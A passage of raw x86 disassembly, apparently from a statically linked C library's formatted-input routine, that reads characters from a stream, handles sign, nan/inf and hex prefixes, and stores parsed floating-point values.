mov eax, dword [edx + ecx*4 + 0x74]
mov dword [ebp + ecx*4 - 0x4c], eax
mov eax, dword [var_100h]
test eax, eax
jle 0x80718ef
mov esi, dword [var_100h]
mov ecx, dword [var_108h]
mov dword [var_4h_2], 0
mov eax, dword [ebp + ecx*4 - 0x4c]
mov dword [esp], eax
call fcn.080537a0
mov edx, dword [var_108h]
inc eax
dec esi
mov dword [ebp + edx*4 - 0x4c], eax
jne 0x80718c7
mov ecx, dword [var_108h]
mov ebx, dword [ebp + ecx*4 - 0x4c]
movzx edx, byte [ebx]
movzx eax, dl
cmp eax, dword [var_9ch]
je 0x8071f41
test dl, dl
je 0x8071f1b
mov edx, dword [var_108h]
mov eax, dword [ebp + edx*4 - 0x4c]
cmp ebx, eax
jbe 0x8071962
cmp dword [var_9ch], 0xffffffff
je 0x8071950
movzx eax, byte [var_9ch]
mov ecx, dword [arg_8h]
dec dword [var_98h]
mov dword [esp], ecx
mov dword [var_4h_2], eax
call fcn.0804e190
mov edx, dword [var_108h]
mov eax, dword [ebp + edx*4 - 0x4c]
dec ebx
cmp ebx, eax
ja 0x8071eef
movzx ebx, byte [ebx]
mov dword [var_9ch], ebx
mov dword [var_4h_2], 0
mov dword [esp], eax
call fcn.080537a0
mov ecx, dword [var_108h]
inc eax
mov dword [ebp + ecx*4 - 0x4c], eax
inc ecx
cmp ecx, 9
mov dword [var_108h], ecx
jle 0x807188f
cmp dword [var_108h], 0xa
je 0x8071d13
cmp dword [var_108h], 9
jg 0x8071aea
mov eax, dword [var_108h]
add eax, 0x30
mov dword [var_9ch], eax
mov eax, dword [var_f0h]
cmp dword [var_f4h], eax
je 0x8071a8c
movzx edx, byte [var_9ch]
mov eax, dword [var_f4h]
mov ecx, dword [var_ech]
mov byte [eax + ecx], dl
inc eax
mov dword [var_f4h], eax
mov eax, dword [var_a0h]
dec eax
cmp dword [var_a0h], 1
cmovl eax, dword [var_a0h]
cmp dword [var_9ch], 0xffffffff
mov dword [var_a0h], eax
je 0x8071a78
mov ecx, dword [ebp + 8]
mov eax, dword [ecx + 4]
cmp eax, dword [ecx + 8]
jae 0x8071a68
movzx edx, byte [eax]
mov ecx, dword [ebp + 8]
inc eax
mov dword [ecx + 4], eax
mov dword [ebp - 0x9c], edx
cmp dword [ebp - 0x9c], 0xffffffff
je 0x8071a59
inc dword [ebp - 0x98]
mov eax, dword [ebp - 0x9c]
mov dword [ebp - 0x9c], eax
inc eax
je 0x8070f3b
mov esi, dword [ebp - 0xa0]
test esi, esi
jne 0x8071885
jmp 0x8070f3b
call fcn.08048b20
mov eax, dword [eax]
mov dword [ebp - 0xb4], eax
jmp 0x8071a33
mov dword [esp], ecx
call fcn.0804da90
mov dword [ebp - 0x9c], eax
jmp 0x8071a24
call fcn.08048b20
mov edx, dword [ebp - 0xb4]
mov dword [eax], edx
mov eax, 0xffffffff
jmp 0x8071a39
add eax, eax
mov edx, dword [var_ech]
cmp eax, 0xff
mov dword [var_f0h], eax
mov eax, 0x100
cmova eax, dword [var_f0h]
mov dword [var_f0h], eax
lea eax, [eax*4 + 0x10]
sub esp, eax
lea ecx, [var_1fh]
and ecx, 0xfffffff0
test edx, edx
mov dword [var_ech], ecx
je 0x80719c8
mov eax, dword [ebp - 0xf4]
mov dword [esp + 4], edx
mov dword [esp], ecx
mov dword [esp + 8], eax
call fcn.08053770
jmp 0x80719c8
test byte [var_a4h], 0x80
je 0x8070f3b
mov eax, dword [var_c8h]
test eax, eax
je 0x8070f3b
mov ebx, dword [ebp - 0xc8]
mov eax, dword [ebp - 0xa0]
mov esi, 0x7fffffff
movzx edx, byte [ebx]
test eax, eax
cmovg esi, dword [ebp - 0xa0]
movzx eax, dl
cmp eax, dword [ebp - 0x9c]
je 0x8071bd0
mov eax, dword [ebp - 0xc8]
movzx edx, byte [eax]
test dl, dl
jne 0x8071b5e
mov edi, dword [ebp - 0xa0]
test edi, edi
cmovle esi, dword [ebp - 0xa0]
dec dword [ebp - 0xf4]
mov dword [ebp - 0xa0], esi
jmp 0x80719b6
cmp ebx, dword [ebp - 0xc8]
jbe 0x8070f3b
mov eax, ebx
sub eax, dword [ebp - 0xc8]
sub dword [ebp - 0xf4], eax
cmp dword [ebp - 0x9c], 0xffffffff
je 0x8071b9d
movzx eax, byte [ebp - 0x9c]
mov edx, dword [ebp + 8]
dec dword [ebp - 0x98]
mov dword [esp], edx
mov dword [esp + 4], eax
call fcn.0804e190
dec ebx
cmp ebx, dword [ebp - 0xc8]
jbe 0x80716aa
dec dword [ebp - 0x98]
mov ecx, dword [ebp + 8]
movzx eax, byte [ebx]
dec ebx
mov dword [esp], ecx
mov dword [esp + 4], eax
call fcn.0804e190
cmp ebx, dword [ebp - 0xc8]
ja 0x8071baa
jmp 0x80716aa
test esi, esi
jle 0x8071b3a
mov edx, dword [ebp - 0xf0]
cmp dword [ebp - 0xf4], edx
je 0x8071cb2
movzx edx, byte [ebp - 0x9c]
mov eax, dword [ebp - 0xf4]
inc ebx
mov ecx, dword [ebp - 0xec]
mov byte [eax + ecx], dl
inc eax
mov dword [ebp - 0xf4], eax
cmp byte [ebx], 0
je 0x8071b3e
cmp dword [ebp - 0x9c], 0xffffffff
je 0x8071c9e
mov ecx, dword [ebp + 8]
mov eax, dword [ecx + 4]
cmp eax, dword [ecx + 8]
jae 0x8071c8e
movzx edx, byte [eax]
mov ecx, dword [ebp + 8]
inc eax
mov dword [ecx + 4], eax
mov dword [ebp - 0x9c], edx
cmp dword [ebp - 0x9c], 0xffffffff
je 0x8071c7f
inc dword [ebp - 0x98]
mov eax, dword [ebp - 0x9c]
mov dword [ebp - 0x9c], eax
inc eax
je 0x8071c77
movzx edx, byte [ebx]
dec esi
movzx eax, dl
cmp eax, dword [ebp - 0x9c]
jne 0x8071b3a
test esi, esi
jg 0x8071bd8
jmp 0x8071b3a
movzx edx, byte [ebx]
jmp 0x8071b3a
call fcn.08048b20
mov eax, dword [eax]
mov dword [ebp - 0xb4], eax
jmp 0x8071c48
mov dword [esp], ecx
call fcn.0804da90
mov dword [ebp - 0x9c], eax
jmp 0x8071c39
call fcn.08048b20
mov edx, dword [ebp - 0xb4]
mov dword [eax], edx
mov eax, 0xffffffff
jmp 0x8071c4e
shl dword [ebp - 0xf0], 1
mov eax, 0x100
mov edx, dword [ebp - 0xec]
cmp dword [ebp - 0xf0], 0xff
cmova eax, dword [ebp - 0xf0]
mov dword [ebp - 0xf0], eax
lea eax, [eax*4 + 0x10]
sub esp, eax
lea ecx, [esp + 0x1f]
and ecx, 0xfffffff0
test edx, edx
mov dword [ebp - 0xec], ecx
je 0x8071bea
mov eax, dword [ebp - 0xf4]
mov dword [esp + 4], edx
mov dword [esp], ecx
mov dword [esp + 8], eax
call fcn.08053770
jmp 0x8071bea
mov esi, dword [var_100h]
inc esi
cmp esi, dword [var_104h]
jg 0x807199a
mov dword [var_108h], 0
mov eax, dword [var_a0h]
mov edi, 0x7fffffff
test eax, eax
mov eax, dword [var_108h]
cmovg edi, dword [var_a0h]
mov ebx, dword [ebp + eax*4 - 0x4c]
movzx edx, byte [ebx]
movzx eax, dl
cmp eax, dword [var_9ch]
je 0x8071e43
test dl, dl
je 0x8071e19
mov edx, dword [ebp - 0x108]
mov eax, dword [ebp + edx*4 - 0x4c]
cmp ebx, eax
jbe 0x8071db3
cmp dword [ebp - 0x9c], 0xffffffff
je 0x8071da5
movzx eax, byte [ebp - 0x9c]
mov ecx, dword [ebp + 8]
dec dword [ebp - 0x98]
mov dword [esp], ecx
mov dword [esp + 4], eax
call fcn.0804e190
mov edx, dword [ebp - 0x108]
mov eax, dword [ebp + edx*4 - 0x4c]
dec ebx
cmp ebx, eax
ja 0x8071df0
movzx ebx, byte [ebx]
mov dword [ebp - 0x9c], ebx
mov dword [esp + 4], 0
mov dword [esp], eax
call fcn.080537a0
mov ecx, dword [ebp - 0x108]
inc eax
mov dword [ebp + ecx*4 - 0x4c], eax
inc ecx
cmp ecx, 9
mov dword [ebp - 0x108], ecx
jle 0x8071d30
inc esi
cmp esi, dword [ebp - 0x104]
jle 0x8071d26
jmp 0x807199a
dec dword [ebp - 0x98]
mov ecx, dword [ebp + 8]
movzx eax, byte [ebx]
dec ebx
mov dword [esp], ecx
mov dword [esp + 4], eax
call fcn.0804e190
mov edx, dword [ebp - 0x108]
mov eax, dword [ebp + edx*4 - 0x4c]
cmp ebx, eax
ja 0x8071df0
jmp 0x8071daa
mov eax, dword [ebp - 0xa0]
test eax, eax
jle 0x8071e29
mov dword [ebp - 0xa0], edi
cmp dword [ebp - 0x108], 9
jg 0x8071dde
mov dword [ebp - 0x100], esi
mov dword [ebp - 0x104], esi
jmp 0x807199a
test edi, edi
jle 0x8071d60
nop
lea esi, [esi]
inc ebx
cmp byte [ebx], 0
je 0x8071e19
cmp dword [ebp - 0x9c], 0xffffffff
je 0x8071edb
mov ecx, dword [ebp + 8]
mov eax, dword [ecx + 4]
cmp eax, dword [ecx + 8]
jae 0x8071ecb
movzx edx, byte [eax]
mov ecx, dword [ebp + 8]
inc eax
mov dword [ecx + 4], eax
mov dword [ebp - 0x9c], edx
cmp dword [ebp - 0x9c], 0xffffffff
je 0x8071ebc
inc dword [ebp - 0x98]
mov eax, dword [ebp - 0x9c]
mov dword [ebp - 0x9c], eax
inc eax
je 0x8071eb4
movzx edx, byte [ebx]
dec edi
movzx eax, dl
cmp eax, dword [ebp - 0x9c]
jne 0x8071d60
test edi, edi
jg 0x8071e50
jmp 0x8071d60
movzx edx, byte [ebx]
jmp 0x8071d60
call fcn.08048b20
mov eax, dword [eax]
mov dword [ebp - 0xb4], eax
jmp 0x8071e89
mov dword [esp], ecx
call fcn.0804da90
mov dword [ebp - 0x9c], eax
jmp 0x8071e7a
call fcn.08048b20
mov edx, dword [ebp - 0xb4]
mov dword [eax], edx
mov eax, 0xffffffff
jmp 0x8071e8f
dec dword [var_98h]
mov ecx, dword [arg_8h]
movzx eax, byte [ebx]
dec ebx
mov dword [esp], ecx
mov dword [var_4h_2], eax
call fcn.0804e190
mov edx, dword [var_108h]
mov eax, dword [ebp + edx*4 - 0x4c]
cmp ebx, eax
ja 0x8071eef
jmp 0x8071959
mov eax, dword [var_a0h]
test eax, eax
mov eax, dword [var_100h]
cmovle edi, dword [var_a0h]
mov dword [var_104h], eax
mov dword [var_a0h], edi
jmp 0x807198d
test edi, edi
jle 0x807190b
lea esi, [esi]
inc ebx
cmp byte [ebx], 0
je 0x8071f1b
cmp dword [var_9ch], 0xffffffff
je 0x8071fdb
mov ecx, dword [arg_8h]
mov eax, dword [ecx + 4]
cmp eax, dword [ecx + 8]
jae 0x8071fcb
movzx edx, byte [eax]
mov ecx, dword [arg_8h]
inc eax
mov dword [ecx + 4], eax
mov dword [var_9ch], edx
cmp dword [var_9ch], 0xffffffff
je 0x8071fbc
inc dword [var_98h]
mov eax, dword [var_9ch]
mov dword [var_9ch], eax
inc eax
je 0x8071fb4
movzx edx, byte [ebx]
dec edi
movzx eax, dl
cmp eax, dword [var_9ch]
jne 0x807190b
test edi, edi
jg 0x8071f50
jmp 0x807190b
movzx edx, byte [ebx]
jmp 0x807190b
call fcn.08048b20
mov eax, dword [eax]
mov dword [var_b4h], eax
jmp 0x8071f89
mov dword [esp], ecx
call fcn.0804da90
mov dword [var_9ch], eax
jmp 0x8071f7a
call fcn.08048b20
mov edx, dword [var_b4h]
mov dword [eax], edx
mov eax, 0xffffffff
jmp 0x8071f8f
mov eax, dword [var_a0h]
dec eax
cmp dword [var_a0h], 1
cmovl eax, dword [var_a0h]
mov dword [var_a0h], eax
mov eax, dword [var_f0h]
cmp dword [var_f4h], eax
je 0x80721b2
movzx edx, byte [var_9ch]
mov eax, dword [var_f4h]
mov ecx, dword [var_ech]
mov byte [eax + ecx], dl
inc eax
cmp dword [var_9ch], 0xffffffff
mov dword [var_f4h], eax
je 0x807219b
mov ecx, dword [arg_8h]
mov eax, dword [ecx + 4]
cmp eax, dword [ecx + 8]
jae 0x8072188
movzx edx, byte [eax]
mov ecx, dword [arg_8h]
inc eax
mov dword [ecx + 4], eax
mov dword [var_9ch], edx
cmp dword [var_9ch], 0xffffffff
je 0x8072176
inc dword [var_98h]
mov eax, dword [var_9ch]
mov dword [var_9ch], eax
mov eax, dword [var_a0h]
test eax, eax
je 0x80720a4
mov ecx, dword [var_ach]
movzx edx, byte [var_9ch]
mov eax, dword [ecx + 0x38]
cmp dword [eax + edx*4], 0x78
je 0x80720c1
mov esi, dword [var_bch]
test esi, esi
jne 0x8070dc6
mov dword [var_bch], 8
jmp 0x8070dac
mov edi, dword [var_bch]
mov eax, 0x10
test edi, edi
cmovne eax, dword [var_bch]
cmp eax, 0x10
mov dword [var_bch], eax
jne 0x8070dac
mov eax, dword [var_a0h]
dec eax
cmp dword [var_a0h], 1
cmovl eax, dword [var_a0h]
cmp dword [var_9ch], 0xffffffff
mov dword [var_a0h], eax
je 0x8072162
mov ecx, dword [arg_8h]
mov eax, dword [ecx + 4]
cmp eax, dword [ecx + 8]
jae 0x8072152
movzx edx, byte [eax]
mov ecx, dword [arg_8h]
inc eax
mov dword [ecx + 4], eax
mov dword [var_9ch], edx
cmp dword [var_9ch], 0xffffffff
je 0x8072143
inc dword [var_98h]
mov eax, dword [var_9ch]
mov dword [var_9ch], eax
jmp 0x8070dac
call fcn.08048b20
mov eax, dword [eax]
mov dword [var_b4h], eax
jmp 0x8072132
mov dword [esp], ecx
call fcn.0804da90
mov dword [var_9ch], eax
jmp 0x8072123
call fcn.08048b20
mov edx, dword [var_b4h]
mov dword [eax], edx
mov eax, 0xffffffff
jmp 0x8072138
call fcn.08048b20
mov eax, dword [eax]
mov dword [var_b4h], eax
jmp 0x8072078
mov dword [esp], ecx
call fcn.0804da90
mov dword [var_9ch], eax
jmp 0x8072065
call fcn.08048b20
mov edx, dword [var_b4h]
mov dword [eax], edx
mov eax, 0xffffffff
jmp 0x807207e
add eax, eax
mov edx, dword [var_ech]
cmp eax, 0xff
mov dword [var_f0h], eax
mov eax, 0x100
cmova eax, dword [var_f0h]
mov dword [var_f0h], eax
lea eax, [eax*4 + 0x10]
sub esp, eax
lea ecx, [var_1fh]
and ecx, 0xfffffff0
test edx, edx
mov dword [var_ech], ecx
je 0x807201c
mov eax, dword [var_f4h]
mov dword [var_4h_2], edx
mov dword [esp], ecx
mov dword [var_8h_2], eax
call fcn.08053770
jmp 0x807201c
mov eax, dword [var_f0h]
cmp dword [var_f4h], eax
je 0x80722c0
mov ecx, dword [var_ech]
mov byte [ecx], bl
mov eax, dword [var_a0h]
mov dword [var_f4h], 1
dec eax
cmp dword [var_a0h], 1
cmovl eax, dword [var_a0h]
inc ebx
mov dword [var_a0h], eax
je 0x80722ac
mov ecx, dword [arg_8h]
mov eax, dword [ecx + 4]
cmp eax, dword [ecx + 8]
jae 0x807229c
movzx edx, byte [eax]
mov ecx, dword [arg_8h]
inc eax
mov dword [ecx + 4], eax
mov dword [var_9ch], edx
cmp dword [var_9ch], 0xffffffff
je 0x807228d
inc dword [var_98h]
mov eax, dword [var_9ch]
mov dword [var_9ch], eax
jmp 0x8070d95
call fcn.08048b20
mov eax, dword [eax]
mov dword [var_b4h], eax
jmp 0x807227c
mov dword [esp], ecx
call fcn.0804da90
mov dword [var_9ch], eax
jmp 0x807226d
call fcn.08048b20
mov edx, dword [var_b4h]
mov dword [eax], edx
mov eax, 0xffffffff
jmp 0x8072282
mov eax, dword [var_ech]
sub esp, 0x410
mov dword [var_f0h], 0x100
lea edx, [var_1fh]
and edx, 0xfffffff0
test eax, eax
mov dword [var_ech], edx
je 0x8072222
mov dword [var_8h_2], 0
mov dword [var_4h_2], eax
mov dword [esp], edx
call fcn.08053770
jmp 0x8072222
call fcn.08048b20
mov eax, dword [eax]
mov dword [var_b4h], eax
jmp 0x8070d66
mov dword [esp], ecx
call fcn.0804da90
mov dword [var_9ch], eax
jmp 0x8070d53
call fcn.08048b20
mov ebx, 0xffffffff
mov edx, dword [var_b4h]
mov dword [eax], edx
jmp 0x8070d6c
cmp dword [var_9ch], 0xffffffff
je 0x8073cf8
mov ecx, dword [arg_8h]
mov eax, dword [ecx + 4]
cmp eax, dword [ecx + 8]
jae 0x8073ce5
movzx edx, byte [eax]
mov ecx, dword [arg_8h]
inc eax
mov dword [ecx + 4], eax
mov dword [var_9ch], edx
cmp dword [var_9ch], 0xffffffff
je 0x8073cd3
inc dword [var_98h]
mov eax, dword [var_9ch]
mov dword [var_9ch], eax
inc eax
je 0x806f8c6
cmp dword [var_9ch], 0x2d
je 0x8073abc
cmp dword [var_9ch], 0x2b
je 0x8073abc
mov ecx, dword [var_ach]
mov byte [var_b7h], 0
mov edx, dword [ecx + 0x38]
movzx eax, byte [var_9ch]
mov eax, dword [edx + eax*4]
cmp eax, 0x6e
je 0x807389f
cmp eax, 0x69
je 0x8072f5b
mov edi, dword [var_a0h]
mov dword [var_c0h], 0
mov byte [var_b8h], 0x65
test edi, edi
je 0x8072400
cmp dword [var_9ch], 0x30
je 0x8072d16
mov byte [var_b6h], 0
mov byte [var_b5h], 0
mov eax, dword [var_9ch]
sub eax, 0x30
cmp eax, 9
ja 0x80727a6
mov ecx, dword [var_f0h]
cmp dword [var_f4h], ecx
je 0x8072751
movzx eax, byte [var_9ch]
mov ecx, dword [var_f4h]
mov edx, dword [var_ech]
mov byte [ecx + edx], al
inc ecx
mov dword [var_f4h], ecx
mov eax, dword [var_a0h]
dec eax
cmp dword [var_a0h], 1
cmovl eax, dword [var_a0h]
mov dword [var_a0h], eax
mov eax, dword [var_a0h]
test eax, eax
je 0x80724c0
cmp dword [var_9ch], 0xffffffff
je 0x807273f
mov edx, dword [arg_8h]
mov eax, dword [edx + 4]
cmp eax, dword [edx + 8]
jae 0x807272c
movzx ecx, byte [eax]
mov edx, dword [arg_8h]
inc eax
mov dword [edx + 4], eax
mov dword [var_9ch], ecx
cmp dword [var_9ch], 0xffffffff
je 0x807271a
inc dword [ebp - 0x98]
cmp dword [ebp - 0x9c], 0xffffffff
jne 0x807240e
mov eax, dword [var_f4h]
test eax, eax
je case.0x806fb57.38
mov eax, dword [var_c0h]
test eax, eax
je 0x80724f2
cmp dword [var_f4h], 2
je case.0x806fb57.38
cmp byte [ebp - 0xb6], 0
je case.0x806fb57.38
mov ecx, dword [var_f0h]
cmp dword [var_f4h], ecx
je 0x80726c5
mov eax, dword [ebp - 0xec]
mov edx, dword [ebp - 0xf4]
mov byte [edx + eax], 0
test byte [ebp - 0xa4], 2
jne 0x8072642
test byte [ebp - 0xa4], 1
je 0x80725c7
mov eax, dword [ebp - 0xa4]
and eax, 0x80
mov dword [esp + 8], eax
lea eax, [ebp - 0x80]
mov dword [esp + 4], eax
mov eax, dword [ebp - 0xec]
mov dword [esp], eax
call fcn.08085c80
test byte [ebp - 0xa4], 8
jne 0x80725c0
mov ecx, dword [ebp - 0x80]
cmp ecx, dword [ebp - 0xec]
je 0x80725b5
mov eax, dword [ebp - 0xfc]
test eax, eax
jne 0x80725a1
mov eax, dword [ebp - 0x8c]
add dword [ebp - 0x8c], 4
fld st(0)
cmp byte [ebp - 0xb7], 0
mov eax, dword [eax]
fchs
fcmove st(0), st(1)
fstp st(1)
fstp qword [eax]
cmp ecx, dword [ebp - 0xec]
jne 0x806fda5
jmp case.0x806fb57.38
mov edx, dword [ebp - 0xfc]
mov eax, dword [ebp + 0x10]
dec edx
je 0x807257d
add eax, 4
dec edx
jne 0x80725ad
jmp 0x807257d
fstp st(0)
jmp case.0x806fb57.38
lea esi, [esi]
fstp st(0)
mov ecx, dword [ebp - 0x80]
jmp 0x8072590
mov eax, dword [ebp - 0xa4]
mov edx, dword [ebp - 0xec]
and eax, 0x80
mov dword [esp], edx
mov dword [esp + 8], eax
lea eax, [ebp - 0x80]
mov dword [esp + 4], eax
call fcn.08085bc0
test byte [ebp - 0xa4], 8
jne 0x80725c0
mov ecx, dword [ebp - 0x80]
cmp ecx, dword [ebp - 0xec]
je 0x80725b5
mov edi, dword [ebp - 0xfc]
test edi, edi
jne 0x807262e
mov eax, dword [ebp - 0x8c]
add dword [ebp - 0x8c], 4
fld st(0)
cmp byte [ebp - 0xb7], 0
mov eax, dword [eax]
fchs
fcmove st(0), st(1)
fstp st(1)
fstp dword [eax]
jmp 0x8072590
mov edx, dword [ebp - 0xfc]
mov eax, dword [ebp + 0x10]
dec edx
je 0x8072616
add eax, 4
dec edx
jne 0x807263a
jmp 0x8072616
mov eax, dword [ebp - 0xa4]
mov ecx, dword [ebp - 0xec]
and eax, 0x80
mov dword [esp], ecx
mov dword [esp + 8], eax
lea eax, [ebp - 0x80]
mov dword [esp + 4], eax
call fcn.08085d40
test byte [ebp - 0xa4], 8
jne 0x80725c0
mov ecx, dword [ebp - 0x80]
cmp ecx, dword [ebp - 0xec]
je 0x80725b5
mov eax, dword [ebp - 0xfc]
test eax, eax
jne 0x80726b1
mov eax, dword [ebp - 0x8c]
add dword [ebp - 0x8c], 4
fld st(0)
cmp byte [ebp - 0xb7], 0
mov eax, dword [eax]
fchs
fcmove st(0), st(1)
fstp st(1)
fstp xword [eax]
jmp 0x8072590
mov edx, dword [ebp - 0xfc]
mov eax, dword [ebp + 0x10]
dec edx
je 0x8072699
add eax, 4
dec edx
jne 0x80726bd
jmp 0x8072699
add ecx, ecx
mov eax, 0x100
mov edx, dword [ebp - 0xec]
cmp ecx, 0xff
cmova eax, ecx
mov dword [ebp - 0xf0], eax
lea eax, [eax*4 + 0x10]
sub esp, eax
lea eax, [esp + 0x1f]
and eax, 0xfffffff0
test edx, edx
mov dword [ebp - 0xec], eax
je 0x8072504
mov ecx, dword [ebp - 0xf4]
mov dword [esp + 4], edx
mov dword [esp], eax
mov dword [esp + 8], ecx
call fcn.08053770
jmp 0x8072504
call fcn.08048b20
mov eax, dword [eax]
mov dword [ebp - 0xb4], eax
jmp 0x80724b3
mov dword [esp], edx
call fcn.0804da90
mov dword [var_9ch], eax
jmp 0x80724a0
call fcn.08048b20
mov edx, dword [var_b4h]
mov dword [eax], edx
jmp 0x80724c0
add ecx, ecx
mov eax, 0x100
mov edx, dword [var_ech]
cmp ecx, 0xff
cmova eax, ecx
mov dword [var_f0h], eax
lea eax, [eax*4 + 0x10]
sub esp, eax
lea eax, [var_1fh_3]
and eax, 0xfffffff0
test edx, edx
mov dword [var_ech], eax
je 0x8072432
mov ecx, dword [var_f4h]
mov dword [var_4h], edx
mov dword [esp], eax
mov dword [var_8h], ecx
call fcn.08053770
jmp 0x8072432
cmp byte [var_b6h], 0
jne 0x807286b
mov esi, dword [var_c0h]
test esi, esi
je 0x8072862
mov edx, dword [var_ach]
mov ecx, dword [var_9ch]
mov eax, dword [edx + 0x34]
test byte [eax + ecx*2 + 1], 0x10
je 0x8072862
mov eax, dword [var_f0h]
cmp dword [var_f4h], eax
je 0x807280b
movzx edx, byte [var_9ch]
mov eax, dword [var_f4h]
mov ecx, dword [var_ech]
mov byte [eax + ecx], dl
inc eax
mov dword [var_f4h], eax
jmp 0x807244f
mov edx, dword [var_ech]
add eax, eax
cmp eax, 0xff
mov dword [var_f0h], eax
mov eax, 0x100
cmova eax, dword [var_f0h]
mov dword [var_f0h], eax
lea eax, [eax*4 + 0x10]
sub esp, eax
lea ecx, [var_1fh_3]
and ecx, 0xfffffff0
test edx, edx
mov dword [var_ech], ecx
je 0x80727e9
mov eax, dword [var_f4h]
mov dword [var_4h], edx
mov dword [esp], ecx
mov dword [var_8h], eax
call fcn.08053770
jmp 0x80727e9
cmp byte [var_b6h], 0
je 0x8072888
mov ecx, dword [var_ech]
mov eax, dword [var_f4h]
movzx edx, byte [var_b8h]
cmp byte [eax + ecx - 1], dl
je 0x8072cd3
mov ebx, dword [var_f4h]
test ebx, ebx
je 0x80728bb
cmp byte [var_b6h], 0
jne 0x80728bb
mov ecx, dword [var_ach]
movzx edx, byte [var_9ch]
mov eax, dword [ecx + 0x38]
movzx ecx, byte [var_b8h]
cmp cl, byte [eax + edx*4]
je 0x8072c45
mov ecx, dword [var_a0h]
mov edi, 0x7fffffff
mov ebx, dword [var_c4h]
test ecx, ecx
cmovg edi, dword [var_a0h]
cmp byte [var_b5h], 0
jne 0x8072c0f
movzx edx, byte [ebx]
movzx eax, dl
cmp eax, dword [var_9ch]
je 0x8072ba5
mov ecx, dword [var_c4h]
movzx edx, byte [ecx]
test dl, dl
jne 0x80729af
mov ebx, dword [var_c4h]
cmp byte [ebx], 0
je 0x807293d
mov ecx, dword [ebp - 0xf0]
cmp dword [ebp - 0xf4], ecx
je 0x807295e
movzx eax, byte [ebx]
mov ecx, dword [ebp - 0xf4]
inc ebx
mov edx, dword [ebp - 0xec]
mov byte [ecx + edx], al
inc ecx
mov dword [ebp - 0xf4], ecx
cmp byte [ebx], 0
jne 0x8072910
mov edx, dword [ebp - 0xa0]
mov byte [ebp - 0xb5], 1
test edx, edx
cmovle edi, dword [ebp - 0xa0]
mov dword [ebp - 0xa0], edi
jmp 0x807244f
add ecx, ecx
mov eax, 0x100
mov edx, dword [ebp - 0xec]
cmp ecx, 0xff
cmova eax, ecx
mov dword [ebp - 0xf0], eax
lea eax, [eax*4 + 0x10]
sub esp, eax
lea eax, [esp + 0x1f]
and eax, 0xfffffff0
test edx, edx
mov dword [ebp - 0xec], eax
je 0x807291e
mov ecx, dword [ebp - 0xf4]
mov dword [esp + 4], edx
mov dword [esp], eax
mov dword [esp + 8], ecx
call fcn.08053770
jmp 0x807291e
test byte [var_a4h], 0x80
mov esi, dword [var_c8h]
je 0x80729fe
test esi, esi
je 0x80729fe
cmp byte [ebp - 0xb5], 0
jne 0x80729fe
mov edx, ebx
sub edx, dword [ebp - 0xc4]
test edx, edx
jle 0x80729e8
mov ecx, dword [ebp - 0xc4]
movzx eax, byte [ecx]
cmp byte [esi], al
je 0x8072b81
mov eax, esi
sub ebx, dword [ebp - 0xc4]
sub eax, dword [ebp - 0xc8]
cmp eax, ebx
je 0x8072ad6
test esi, esi
je 0x8072aa8
cmp byte [esi], 0
jne 0x8072aa8
mov ebx, dword [ebp - 0xc8]
cmp byte [ebx], 0
je 0x8072a47
mov ecx, dword [ebp - 0xf0]
cmp dword [ebp - 0xf4], ecx
je 0x8072a5a
movzx eax, byte [ebx]
mov ecx, dword [ebp - 0xf4]
inc ebx
mov edx, dword [ebp - 0xec]
mov byte [ecx + edx], al
inc ecx
mov dword [ebp - 0xf4], ecx
cmp byte [ebx], 0
jne 0x8072a1a
mov eax, dword [ebp - 0xa0]
test eax, eax
jg 0x8072953
jmp 0x807246a
add ecx, ecx
mov eax, 0x100
mov edx, dword [ebp - 0xec]
cmp ecx, 0xff
cmova eax, ecx
mov dword [ebp - 0xf0], eax
lea eax, [eax*4 + 0x10]
sub esp, eax
lea eax, [esp + 0x1f]
and eax, 0xfffffff0
test edx, edx
mov dword [ebp - 0xec], eax
je 0x8072a28
mov ecx, dword [ebp - 0xf4]
mov dword [esp + 4], edx
mov dword [esp], eax
mov dword [esp + 8], ecx
call fcn.08053770
jmp 0x8072a28
cmp dword [ebp - 0x9c], 0xffffffff
je 0x80724c0
movzx eax, byte [ebp - 0x9c]
dec dword [ebp - 0x98]
mov dword [esp + 4], eax
mov eax, dword [ebp + 8]
mov dword [esp], eax
call fcn.0804e190
jmp 0x80724c0
movzx eax, byte [esi]
cmp eax, dword [ebp - 0x9c]
jne 0x80729fe
test edi, edi
jle 0x80729fe
inc esi
cmp byte [esi], 0
je 0x80729fe
cmp dword [ebp - 0x9c], 0xffffffff
je 0x8072b6f
mov edx, dword [ebp + 8]
mov eax, dword [edx + 4]
cmp eax, dword [edx + 8]
jae 0x8072b5f
movzx ecx, byte [eax]
mov edx, dword [ebp + 8]
inc eax
mov dword [edx + 4], eax
mov dword [ebp - 0x9c], ecx
cmp dword [ebp - 0x9c], 0xffffffff
je 0x8072b50
inc dword [ebp - 0x98]
cmp dword [ebp - 0x9c], 0xffffffff
je 0x80729fe
movzx eax, byte [esi]
dec edi
cmp eax, dword [ebp - 0x9c]
jne 0x80729fe
test edi, edi
jg 0x8072aed
jmp 0x80729fe
call fcn.08048b20
mov eax, dword [eax]
mov dword [ebp - 0xb4], eax
jmp 0x8072b2a
mov dword [esp], edx
call fcn.0804da90
mov dword [ebp - 0x9c], eax
jmp 0x8072b1b
call fcn.08048b20
mov edx, dword [ebp - 0xb4]
mov dword [eax], edx
jmp 0x80729fe
inc esi
mov eax, esi
sub eax, dword [ebp - 0xc8]
cmp eax, edx
jge 0x80729e8
mov ecx, dword [ebp - 0xc4]
movzx eax, byte [eax + ecx]
cmp byte [esi], al
je 0x8072b81
jmp 0x80729e8
test edi, edi
jle 0x80728fd
inc ebx
cmp byte [ebx], 0
je 0x8072905
cmp dword [ebp - 0x9c], 0xffffffff
je 0x8072c36
mov edx, dword [ebp + 8]
mov eax, dword [edx + 4]
cmp eax, dword [edx + 8]
jae 0x8072c26
movzx ecx, byte [eax]
mov edx, dword [ebp + 8]
inc eax
mov dword [edx + 4], eax
mov dword [ebp - 0x9c], ecx
cmp dword [ebp - 0x9c], 0xffffffff
je 0x8072c17
inc dword [ebp - 0x98]
cmp dword [ebp - 0x9c], 0xffffffff
je 0x8072c0f
movzx edx, byte [ebx]
dec edi
movzx eax, dl
cmp eax, dword [ebp - 0x9c]
jne 0x80728fd
test edi, edi
jg 0x8072bad
jmp 0x80728fd
movzx edx, byte [ebx]
jmp 0x80728fd
call fcn.08048b20
mov eax, dword [eax]
mov dword [ebp - 0xb4], eax
jmp 0x8072bea
mov dword [esp], edx
call fcn.0804da90
mov dword [ebp - 0x9c], eax
jmp 0x8072bdb
call fcn.08048b20
mov edx, dword [ebp - 0xb4]
mov dword [eax], edx
jmp 0x8072c0f
mov eax, dword [var_f0h]
